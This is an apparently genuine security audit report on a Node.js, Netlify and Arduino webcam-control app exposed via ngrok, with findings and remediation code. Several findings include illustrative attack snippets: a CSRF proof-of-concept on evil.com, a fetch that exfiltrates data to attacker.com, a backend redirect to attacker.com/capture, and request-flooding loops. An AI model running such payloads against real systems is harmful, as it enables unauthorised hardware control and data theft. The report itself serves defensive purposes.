# Security Audit Report
## Webcam Streaming + Arduino Control Application

**Audit Date:** 2025-10-27
**Auditor:** Security Engineer
**Application:** Webcam streaming with Arduino control via ngrok
**Architecture:** Static frontend (Netlify) + Node.js backend (local) + Arduino hardware

---

## Executive Summary

This security audit identified **13 critical/high-severity vulnerabilities** across authentication, input validation, CORS configuration, and infrastructure security. The application exposes physical hardware control to the public internet without any authentication mechanism, creating significant security and safety risks.

**Risk Level: CRITICAL**

### Key Findings
- No authentication/authorization on any endpoints
- Unrestricted CORS allowing any origin
- Serial command injection vulnerabilities
- Excessive CSP permissions (http:, https:)
- No rate limiting or DoS protection
- Sensitive information disclosure
- No HTTPS enforcement
- Missing security headers
- No logging/monitoring for security events

---

## Vulnerability Details

### CRITICAL SEVERITY

#### 1. Complete Absence of Authentication/Authorization
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/server.js` (All endpoints)
**CWE-306:** Missing Authentication for Critical Function
**CVSS Score:** 10.0 (Critical)

**Description:**
All Arduino control endpoints are completely unauthenticated and unprotected. Anyone with the ngrok URL can control physical hardware.

**Affected Endpoints:**
- POST `/arduino/toggle`
- POST `/arduino/on`
- POST `/arduino/off`
- POST `/arduino/red/on`
- POST `/arduino/red/off`
- POST `/arduino/blue/on`
- POST `/arduino/blue/off`
- POST `/arduino/all/on`
- POST `/arduino/all/off`
- POST `/arduino/alternate/start`
- POST `/arduino/alternate/stop`
- GET `/arduino/status`

**Attack Scenario:**
```bash
# Attacker discovers your ngrok URL
curl -X POST https://your-ngrok-url.ngrok.io/arduino/all/on
curl -X POST https://your-ngrok-url.ngrok.io/arduino/alternate/start
# Attacker now controls your physical hardware
```

**Impact:**
- Unauthorized control of physical hardware
- Potential property damage if controlling motors/actuators
- Privacy violations if controlling cameras/sensors
- Denial of service by continuously toggling devices
- Could be weaponized in smart home scenarios

**Remediation:**
1. **Implement API Key Authentication (Minimum):**
```javascript
// Add to server.js
const API_KEY = process.env.ARDUINO_API_KEY || require('crypto').randomBytes(32).toString('hex');

// Middleware for authentication
const authenticateAPIKey = (req, res, next) => {
    const providedKey = req.headers['x-api-key'] || req.query.api_key;

    if (!providedKey || providedKey !== API_KEY) {
        return res.status(401).json({
            success: false,
            error: 'Unauthorized: Invalid or missing API key'
        });
    }
    next();
};

// Protect all Arduino endpoints
app.use('/arduino', authenticateAPIKey);
```

2. **Implement JWT-Based Authentication (Recommended):**
```javascript
const jwt = require('jsonwebtoken');
const JWT_SECRET = process.env.JWT_SECRET || require('crypto').randomBytes(64).toString('hex');

// Login endpoint
app.post('/auth/login', (req, res) => {
    const { username, password } = req.body;

    // Verify credentials (use bcrypt for password hashing)
    if (username === process.env.ADMIN_USER &&
        bcrypt.compareSync(password, process.env.ADMIN_PASSWORD_HASH)) {
        const token = jwt.sign(
            { user: username, role: 'admin' },
            JWT_SECRET,
            { expiresIn: '1h' }
        );
        res.json({ success: true, token });
    } else {
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});

// JWT verification middleware
const authenticateJWT = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];

    if (!token) {
        return res.status(401).json({ success: false, error: 'No token provided' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ success: false, error: 'Invalid token' });
        }
        req.user = user;
        next();
    });
};

app.use('/arduino', authenticateJWT);
```

3. **Add IP Whitelisting:**
```javascript
const ALLOWED_IPS = (process.env.ALLOWED_IPS || '').split(',');

const ipWhitelist = (req, res, next) => {
    const clientIP = req.ip || req.connection.remoteAddress;

    if (ALLOWED_IPS.length > 0 && !ALLOWED_IPS.includes(clientIP)) {
        return res.status(403).json({
            success: false,
            error: 'Access denied: IP not whitelisted'
        });
    }
    next();
};

app.use('/arduino', ipWhitelist);
```

---

#### 2. Unrestricted CORS Configuration
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/server.js:10`
**CWE-346:** Origin Validation Error
**CVSS Score:** 8.6 (High)

**Vulnerable Code:**
```javascript
app.use(cors());
```

**Description:**
CORS is configured to allow requests from ANY origin, enabling any website to control your Arduino.

**Attack Scenario:**
1. Attacker creates malicious website at `evil.com`
2. Embeds JavaScript that calls your ngrok URL
3. Any visitor to `evil.com` unknowingly triggers Arduino commands
4. Creates a botnet of physical device controllers

**Proof of Concept:**
```html
<!-- Attacker's website -->
<script>
fetch('https://your-ngrok-url.ngrok.io/arduino/alternate/start', {
    method: 'POST'
}).then(() => {
    console.log('Victim is now controlling Arduino without knowing');
});
</script>
```

**Impact:**
- Cross-Site Request Forgery (CSRF) attacks
- Unauthorized access from any domain
- Enables phishing and social engineering attacks
- Cannot be mitigated by authentication alone

**Remediation:**
```javascript
// server.js - Replace line 10
const cors = require('cors');

const ALLOWED_ORIGINS = [
    'https://your-netlify-site.netlify.app',
    'https://your-custom-domain.com',
    process.env.NODE_ENV === 'development' ? 'http://localhost:*' : null
].filter(Boolean);

const corsOptions = {
    origin: function (origin, callback) {
        // Allow requests with no origin (mobile apps, Postman, etc.)
        if (!origin) return callback(null, true);

        if (ALLOWED_ORIGINS.some(allowed => {
            if (allowed.includes('*')) {
                const pattern = new RegExp(allowed.replace('*', '.*'));
                return pattern.test(origin);
            }
            return allowed === origin;
        })) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key']
};

app.use(cors(corsOptions));
```

---

#### 3. Serial Command Injection Vulnerability
**Files:**
- `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/arduino_led_control.ino:44`
- `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/arduino_dual_led_control.ino:84`

**CWE-77:** Improper Neutralization of Special Elements
**CVSS Score:** 8.1 (High)

**Vulnerable Code (Arduino):**
```c
String command = Serial.readStringUntil('\n');
command.trim();
// No validation before processing
```

**Vulnerable Code (Node.js):**
```javascript
port.write('R1\n', (err) => { // Hardcoded, but no validation of future changes
```

**Description:**
While current implementation uses hardcoded commands, the architecture allows arbitrary serial data injection if the Node.js code is modified. The Arduino code accepts any string up to newline without length limits or validation.

**Attack Scenarios:**
1. **Buffer Overflow Attempt:**
```javascript
port.write('A'.repeat(10000) + '\n');
```

2. **Command Injection via Modified Backend:**
```javascript
// If user input was ever added:
const userCommand = req.body.command; // DANGEROUS
port.write(userCommand + '\n'); // Direct injection
```

3. **Timing Attacks:**
```javascript
// Rapidly send commands to exhaust serial buffer
for (let i = 0; i < 1000; i++) {
    port.write('INVALID_COMMAND_' + i + '\n');
}
```

**Impact:**
- Arduino buffer overflow (String object exhaustion)
- Denial of service via serial buffer flooding
- Undefined behavior from malformed commands
- Potential memory corruption on Arduino

**Remediation:**

**Node.js Side:**
```javascript
// Add command validation middleware
const VALID_COMMANDS = [
    'T', '1', '0', 'R1', 'R0', 'B1', 'B0',
    'ALL_ON', 'ALL_OFF', 'ALTERNATE', 'STOP'
];

const MAX_COMMAND_LENGTH = 20;

function validateSerialCommand(command) {
    if (!command || typeof command !== 'string') {
        return { valid: false, error: 'Invalid command type' };
    }

    if (command.length > MAX_COMMAND_LENGTH) {
        return { valid: false, error: 'Command too long' };
    }

    if (!VALID_COMMANDS.includes(command)) {
        return { valid: false, error: 'Unknown command' };
    }

    return { valid: true };
}

function sendSerialCommand(command, callback) {
    const validation = validateSerialCommand(command);

    if (!validation.valid) {
        return callback(new Error(validation.error));
    }

    port.write(command + '\n', callback);
}

// Update all endpoints to use validated function
app.post('/arduino/red/on', (req, res) => {
    if (!isConnected || !port) {
        return res.status(503).json({ success: false, error: 'Arduino not connected' });
    }

    sendSerialCommand('R1', (err) => {
        if (err) {
            return res.status(500).json({ success: false, error: err.message });
        }
        console.log('🔴 Red LED turned ON');
        res.json({ success: true, message: 'Red LED turned ON' });
    });
});
```

**Arduino Side:**
```c
// arduino_dual_led_control.ino - Enhanced validation
const int MAX_COMMAND_LENGTH = 20;
unsigned long lastCommandTime = 0;
const unsigned long COMMAND_COOLDOWN = 100; // 100ms between commands

void loop() {
    // Rate limiting
    unsigned long currentTime = millis();
    if (currentTime - lastCommandTime < COMMAND_COOLDOWN) {
        return;
    }

    if (Serial.available() > 0) {
        // Limit command length to prevent buffer overflow
        String command = "";
        char c;
        int length = 0;

        while (Serial.available() > 0 && length < MAX_COMMAND_LENGTH) {
            c = Serial.read();
            if (c == '\n' || c == '\r') break;
            command += c;
            length++;
        }

        // Clear any remaining buffer
        while (Serial.available() > 0) {
            Serial.read();
        }

        command.trim();

        // Validate command is not empty
        if (command.length() == 0) {
            return;
        }

        lastCommandTime = currentTime;

        // Process validated command
        processCommand(command);
    }
}

void processCommand(String command) {
    // Existing command processing logic...
}
```

---

#### 4. Excessive CSP Permissions - Wildcard in connect-src
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/netlify.toml:21`
**CWE-1021:** Improper Restriction of Rendered UI Layers
**CVSS Score:** 7.5 (High)

**Vulnerable Configuration:**
```
Content-Security-Policy = "... connect-src 'self' https://0.peerjs.com wss://0.peerjs.com https://*.peerjs.com wss://*.peerjs.com http: https: ..."
```

**Description:**
The CSP includes `http:` and `https:` in `connect-src`, which allows connections to ANY HTTP/HTTPS endpoint. This defeats the purpose of CSP and enables data exfiltration.

**Attack Scenario:**
```javascript
// If XSS vulnerability exists, attacker can:
fetch('https://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify({
        peerIds: document.getElementById('peerId').textContent,
        backendUrl: localStorage.getItem('arduinoBackendUrl'),
        // Any sensitive data
    })
});
```

**Impact:**
- Data exfiltration to attacker-controlled servers
- Bypasses CSP protection entirely for network requests
- Enables malware communication if XSS is achieved
- Credential theft from localStorage

**Remediation:**
```toml
# netlify.toml - Strict CSP
[[headers]]
  for = "/*"
  [headers.values]
    # Remove http: and https: wildcards
    # Instead, explicitly allow specific domains
    Content-Security-Policy = """
      default-src 'self';
      script-src 'self' 'unsafe-inline' https://unpkg.com;
      connect-src 'self'
        https://0.peerjs.com
        wss://0.peerjs.com
        https://*.peerjs.com
        wss://*.peerjs.com
        http://localhost:3000
        http://localhost:*
        https://*.ngrok.io
        https://*.ngrok-free.app;
      style-src 'self' 'unsafe-inline';
      media-src 'self' blob: mediastream:;
      img-src 'self' data: blob:;
      worker-src 'self' blob:;
      frame-ancestors 'self';
      form-action 'self';
      base-uri 'self';
    """
```

**Note:** For production, create an environment variable system to inject the specific ngrok URL.

---

### HIGH SEVERITY

#### 5. Information Disclosure - Serial Port Configuration
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/server.js:18`
**CWE-200:** Information Exposure
**CVSS Score:** 6.5 (Medium)

**Vulnerable Code:**
```javascript
const ARDUINO_PORT = '/dev/cu.usbmodem14101'; // CHANGE THIS!
```

**Description:**
Serial port path is hardcoded in source code, exposing system configuration details.

**Impact:**
- Reveals OS type (macOS from `/dev/cu.*`)
- System enumeration information
- Makes automated attacks easier

**Remediation:**
```javascript
// server.js
const ARDUINO_PORT = process.env.ARDUINO_PORT || '/dev/ttyUSB0';

// .env file (never commit to git)
ARDUINO_PORT=/dev/cu.usbmodem14101

// .gitignore
.env
.env.local
```

---

#### 6. No Rate Limiting or DoS Protection
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/server.js` (All endpoints)
**CWE-770:** Allocation of Resources Without Limits
**CVSS Score:** 7.5 (High)

**Description:**
No rate limiting on any endpoint allows attackers to flood the server and Arduino with commands.

**Attack Scenario:**
```javascript
// DoS attack script
for (let i = 0; i < 10000; i++) {
    fetch('https://your-ngrok-url.ngrok.io/arduino/toggle', { method: 'POST' });
}
```

**Impact:**
- Server resource exhaustion
- Serial port buffer overflow
- Physical device damage from rapid state changes
- Service unavailability

**Remediation:**
```javascript
const rateLimit = require('express-rate-limit');

// General API rate limiting
const generalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per windowMs
    message: { success: false, error: 'Too many requests, please try again later.' },
    standardHeaders: true,
    legacyHeaders: false,
});

// Strict rate limiting for Arduino control
const arduinoLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 30, // Maximum 30 commands per minute
    message: { success: false, error: 'Too many Arduino commands, please slow down.' },
    skipSuccessfulRequests: false,
});

app.use('/arduino', arduinoLimiter);
app.use(generalLimiter);

// Additional: Command throttling on Arduino side (see previous Arduino code)
```

---

#### 7. Missing Security Headers
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/server.js`
**CWE-693:** Protection Mechanism Failure
**CVSS Score:** 5.3 (Medium)

**Description:**
Node.js backend lacks security headers, making it vulnerable to various attacks when accessed directly.

**Missing Headers:**
- X-Content-Type-Options
- X-Frame-Options
- X-XSS-Protection
- Strict-Transport-Security
- Content-Security-Policy

**Remediation:**
```javascript
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
        },
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    frameguard: {
        action: 'deny'
    },
    noSniff: true,
    xssFilter: true,
}));
```

---

#### 8. Insecure Direct Object Reference in Frontend
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/index.html:171`
**CWE-639:** Insecure Direct Object Reference
**CVSS Score:** 6.5 (Medium)

**Vulnerable Code:**
```javascript
let BACKEND_URL = localStorage.getItem('arduinoBackendUrl') || 'http://localhost:3000';
```

**Description:**
Backend URL stored in localStorage can be manipulated by XSS or malicious browser extensions.

**Attack Scenario:**
```javascript
// Attacker injects script or uses browser console
localStorage.setItem('arduinoBackendUrl', 'https://attacker.com/capture');
// All subsequent Arduino commands are sent to attacker's server
```

**Impact:**
- Man-in-the-middle attacks
- Credential harvesting
- Command interception
- Traffic analysis

**Remediation:**
```javascript
// Add URL validation
function validateBackendUrl(url) {
    try {
        const parsed = new URL(url);

        // Only allow specific protocols
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return false;
        }

        // Whitelist approach (recommended for production)
        const ALLOWED_HOSTS = [
            'localhost',
            '127.0.0.1',
            /^.*\.ngrok\.io$/,
            /^.*\.ngrok-free\.app$/,
        ];

        const hostname = parsed.hostname;
        const isAllowed = ALLOWED_HOSTS.some(pattern => {
            if (pattern instanceof RegExp) {
                return pattern.test(hostname);
            }
            return pattern === hostname;
        });

        if (!isAllowed) {
            console.error('Backend URL not in whitelist:', hostname);
            return false;
        }

        return true;
    } catch (e) {
        return false;
    }
}

function connectToBackend() {
    const inputUrl = document.getElementById('backendUrlInput').value.trim();
    if (!inputUrl) {
        alert('Please enter a backend URL');
        return;
    }

    if (!validateBackendUrl(inputUrl)) {
        alert('Invalid or disallowed backend URL. Only localhost and *.ngrok.io domains are permitted.');
        return;
    }

    BACKEND_URL = inputUrl.replace(/\/$/, '');
    localStorage.setItem('arduinoBackendUrl', BACKEND_URL);
    // ... rest of function
}

// Validate on page load
const savedUrl = localStorage.getItem('arduinoBackendUrl');
if (savedUrl && !validateBackendUrl(savedUrl)) {
    console.warn('Saved backend URL failed validation, removing');
    localStorage.removeItem('arduinoBackendUrl');
    BACKEND_URL = 'http://localhost:3000';
}
```

---

#### 9. No HTTPS Enforcement
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/server.js`
**CWE-319:** Cleartext Transmission of Sensitive Information
**CVSS Score:** 7.4 (High)

**Description:**
Server runs on HTTP without TLS/SSL, exposing all traffic to interception. While ngrok provides HTTPS, the local server does not.

**Impact:**
- Credentials transmitted in cleartext
- Session hijacking
- Man-in-the-middle attacks
- Command interception on local network

**Remediation:**
```javascript
const https = require('https');
const fs = require('fs');
const path = require('path');

// Load SSL certificates
const sslOptions = {
    key: fs.readFileSync(process.env.SSL_KEY_PATH || './certs/server-key.pem'),
    cert: fs.readFileSync(process.env.SSL_CERT_PATH || './certs/server-cert.pem'),
};

// Create HTTPS server
const httpsServer = https.createServer(sslOptions, app);

httpsServer.listen(PORT, () => {
    console.log(`🚀 Secure server running on https://localhost:${PORT}`);
});

// Redirect HTTP to HTTPS
const http = require('http');
http.createServer((req, res) => {
    res.writeHead(301, { Location: `https://${req.headers.host}${req.url}` });
    res.end();
}).listen(80);
```

**Generate Self-Signed Certificate (Development):**
```bash
openssl req -x509 -newkey rsa:4096 -keyout server-key.pem -out server-cert.pem -days 365 -nodes
```

---

#### 10. Logging and Monitoring Deficiencies
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/server.js`
**CWE-778:** Insufficient Logging
**CVSS Score:** 5.0 (Medium)

**Description:**
No security event logging, making it impossible to detect or investigate attacks.

**Missing Logs:**
- Authentication attempts (once implemented)
- Failed authorization attempts
- Unusual command patterns
- Connection source IPs
- Command execution timeline

**Remediation:**
```javascript
const winston = require('winston');
const morgan = require('morgan');

// Configure winston logger
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'security.log', level: 'warn' }),
        new winston.transports.File({ filename: 'combined.log' }),
    ],
});

// HTTP request logging
app.use(morgan('combined', {
    stream: {
        write: (message) => logger.info(message.trim())
    }
}));

// Security event logging
function logSecurityEvent(event, details) {
    logger.warn({
        event,
        timestamp: new Date().toISOString(),
        ...details
    });
}

// Example usage in endpoint
app.post('/arduino/toggle', authenticateAPIKey, (req, res) => {
    logSecurityEvent('arduino_command', {
        command: 'toggle',
        ip: req.ip,
        userAgent: req.get('user-agent'),
        apiKey: req.headers['x-api-key']?.substring(0, 8) + '...'
    });

    // ... rest of endpoint logic
});

// Failed authentication logging
const authenticateAPIKey = (req, res, next) => {
    const providedKey = req.headers['x-api-key'] || req.query.api_key;

    if (!providedKey || providedKey !== API_KEY) {
        logSecurityEvent('authentication_failed', {
            ip: req.ip,
            userAgent: req.get('user-agent'),
            path: req.path,
            providedKey: providedKey ? providedKey.substring(0, 8) + '...' : 'none'
        });

        return res.status(401).json({
            success: false,
            error: 'Unauthorized: Invalid or missing API key'
        });
    }
    next();
};
```

---

### MEDIUM SEVERITY

#### 11. XSS Risk via Unsanitized PeerJS ID Display
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/index.html:353`
**CWE-79:** Cross-Site Scripting
**CVSS Score:** 6.1 (Medium)

**Vulnerable Code:**
```javascript
peer.on('open', (id) => {
    document.getElementById('peerId').textContent = id;  // Safe, but...
```

**Description:**
While `textContent` is XSS-safe, PeerJS IDs are user-controllable and displayed without validation. If any part of the code switches to `innerHTML`, XSS becomes possible.

**Remediation:**
```javascript
function sanitizePeerId(id) {
    // Only allow alphanumeric and hyphens
    return id.replace(/[^a-zA-Z0-9-]/g, '');
}

peer.on('open', (id) => {
    const sanitizedId = sanitizePeerId(id);
    document.getElementById('peerId').textContent = sanitizedId;
    console.log('My peer ID is: ' + sanitizedId);
});
```

---

#### 12. Lack of Input Validation on Peer ID Connection
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/index.html:420`
**CWE-20:** Improper Input Validation
**CVSS Score:** 5.3 (Medium)

**Vulnerable Code:**
```javascript
const remotePeerId = document.getElementById('peerIdInput').value.trim();
if (!remotePeerId) {
    alert('Please enter a Peer ID');
    return;
}
const call = peer.call(remotePeerId, dummyStream);
```

**Description:**
No validation of peer ID format before attempting connection, could lead to unexpected behavior.

**Remediation:**
```javascript
function validatePeerId(peerId) {
    // PeerJS IDs are typically alphanumeric with hyphens
    const peerIdRegex = /^[a-zA-Z0-9-]{1,64}$/;
    return peerIdRegex.test(peerId);
}

async function connectToStream() {
    const remotePeerId = document.getElementById('peerIdInput').value.trim();

    if (!remotePeerId) {
        alert('Please enter a Peer ID');
        return;
    }

    if (!validatePeerId(remotePeerId)) {
        alert('Invalid Peer ID format. Use only letters, numbers, and hyphens.');
        return;
    }

    // ... rest of function
}
```

---

#### 13. Insecure Dependency Management
**File:** `/Users/jagmeetsinghsachdeva/Documents/GitHub/stream/package.json`
**CWE-1104:** Use of Unmaintained Third Party Components
**CVSS Score:** 5.0 (Medium)

**Description:**
No package-lock.json, unpinned dependency versions, and no vulnerability scanning.

**Issues:**
- Floating version ranges (`^4.18.2`) allow automatic updates
- No lockfile means inconsistent builds
- No audit trail for dependency changes
- Using CDN-hosted PeerJS without SRI

**Remediation:**

1. **Pin Dependency Versions:**
```json
{
  "dependencies": {
    "express": "4.18.2",
    "serialport": "12.0.0",
    "cors": "2.8.5",
    "helmet": "7.1.0",
    "express-rate-limit": "7.1.5",
    "jsonwebtoken": "9.0.2",
    "bcryptjs": "2.4.3",
    "winston": "3.11.0",
    "morgan": "1.10.0"
  }
}
```

2. **Generate Lockfile:**
```bash
npm install --package-lock-only
npm audit fix
```

3. **Add SRI to CDN Resources:**
```html
<script
    src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"
    integrity="sha384-[HASH]"
    crossorigin="anonymous">
</script>
```

4. **Setup Dependabot (GitHub):**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

---

## Infrastructure Security Issues

### ngrok Security Concerns

**Risk:** Exposing local Arduino backend via ngrok creates multiple security risks:

1. **Persistent Tunnel Risk:**
   - Anyone with the URL has permanent access
   - URL may be leaked in logs, referrer headers, etc.
   - No built-in authentication in free tier

2. **Traffic Inspection:**
   - ngrok can see all traffic
   - Free tier URLs are sequential and guessable
   - No client certificate validation

**Recommendations:**

1. **Use ngrok Authentication:**
```bash
ngrok http 3000 --auth="username:password"
```

2. **Use ngrok API for Dynamic URLs:**
```javascript
// Programmatically create tunnels with authentication
const ngrok = require('ngrok');
const url = await ngrok.connect({
    addr: 3000,
    auth: 'user:password',
    region: 'us',
    onStatusChange: status => console.log('ngrok status:', status),
});
console.log('Secure tunnel:', url);
```

3. **Consider Alternatives:**
   - Cloudflare Tunnel (zero-trust access)
   - Tailscale (private VPN mesh)
   - WireGuard (self-hosted VPN)
   - AWS IoT Core (managed IoT platform)

---

## Additional Security Recommendations

### 1. Implement Command Audit Trail
```javascript
// Store command history
const commandHistory = [];

function auditCommand(command, source, result) {
    const entry = {
        timestamp: new Date().toISOString(),
        command,
        source: {
            ip: source.ip,
            userAgent: source.userAgent,
        },
        result,
    };

    commandHistory.push(entry);

    // Persist to file
    fs.appendFileSync('command-audit.log', JSON.stringify(entry) + '\n');
}
```

### 2. Add Emergency Stop Mechanism
```javascript
// Emergency stop endpoint
app.post('/arduino/emergency-stop', authenticateAPIKey, (req, res) => {
    if (!isConnected || !port) {
        return res.status(503).json({ success: false, error: 'Arduino not connected' });
    }

    // Turn everything off
    port.write('ALL_OFF\n');
    port.write('STOP\n');

    logSecurityEvent('emergency_stop', {
        ip: req.ip,
        timestamp: new Date().toISOString()
    });

    res.json({ success: true, message: 'Emergency stop executed' });
});
```

### 3. Implement Connection Timeout
```javascript
const CONNECTION_TIMEOUT = 30000; // 30 seconds
let lastCommandTime = Date.now();

setInterval(() => {
    if (Date.now() - lastCommandTime > CONNECTION_TIMEOUT) {
        // Auto-disconnect idle connections
        if (port && isConnected) {
            port.write('ALL_OFF\n');
            logger.info('Idle timeout: All LEDs turned off');
        }
    }
}, 10000); // Check every 10 seconds
```

### 4. Add HTTPS to Netlify Headers
```toml
# netlify.toml - Add HTTPS upgrade
[[redirects]]
  from = "http://*"
  to = "https://:splat"
  status = 301
  force = true
```

### 5. Implement Session Management
```javascript
const session = require('express-session');

app.use(session({
    secret: process.env.SESSION_SECRET || require('crypto').randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true, // Requires HTTPS
        httpOnly: true,
        maxAge: 3600000, // 1 hour
        sameSite: 'strict'
    }
}));
```

---

## Compliance Considerations

### GDPR/Privacy
- No personal data collection currently
- Webcam streams should have consent mechanism
- Log retention policy needed

### Product Safety
- Physical device control requires safety mechanisms
- Emergency stop functionality critical
- Rate limiting prevents device damage

### IoT Security Standards
- Consider OWASP IoT Top 10
- Implement secure boot (if upgrading hardware)
- Device identity and authentication

---

## Priority Remediation Roadmap

### Phase 1 (Immediate - Day 1)
1. Implement API key authentication
2. Restrict CORS to specific origin
3. Add rate limiting
4. Enable security logging

### Phase 2 (Week 1)
5. Add input validation to all endpoints
6. Implement command whitelisting
7. Add URL validation in frontend
8. Setup HTTPS for local server

### Phase 3 (Week 2)
9. Implement JWT authentication
10. Add helmet security headers
11. Setup dependency scanning
12. Create audit logging system

### Phase 4 (Month 1)
13. Implement session management
14. Add emergency stop mechanism
15. Setup monitoring/alerting
16. Conduct penetration testing

---

## Testing Recommendations

### Security Testing Checklist
- [ ] Penetration testing of all endpoints
- [ ] Fuzzing serial command parser
- [ ] Load testing with rate limits
- [ ] CORS policy verification
- [ ] CSP policy testing
- [ ] Authentication bypass attempts
- [ ] Session management testing
- [ ] TLS/SSL configuration audit

### Tools Recommended
- OWASP ZAP for web vulnerability scanning
- Burp Suite for API testing
- nmap for port scanning
- Wireshark for traffic analysis
- npm audit for dependency scanning
- Snyk for continuous vulnerability monitoring

---

## Conclusion

This application has significant security vulnerabilities that must be addressed before any production deployment. The combination of physical hardware control, public internet exposure, and lack of authentication creates a critical risk profile.

**Immediate Action Required:**
1. Do not use in production without implementing authentication
2. Never expose ngrok URL publicly
3. Implement at minimum Phase 1 remediations

**Estimated Remediation Effort:**
- Phase 1: 4-8 hours
- Phase 2: 8-16 hours
- Phase 3: 16-24 hours
- Phase 4: 24-40 hours

**Total: 52-88 hours for full remediation**

---

## References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP IoT Top 10: https://owasp.org/www-project-internet-of-things/
- CWE Top 25: https://cwe.mitre.org/top25/
- PeerJS Security: https://peerjs.com/docs/
- Express Security Best Practices: https://expressjs.com/en/advanced/best-practice-security.html
- Arduino Security: https://www.arduino.cc/en/security

---

**Audit Completed:** 2025-10-27
**Next Review Recommended:** After implementing Phase 1-2 remediations
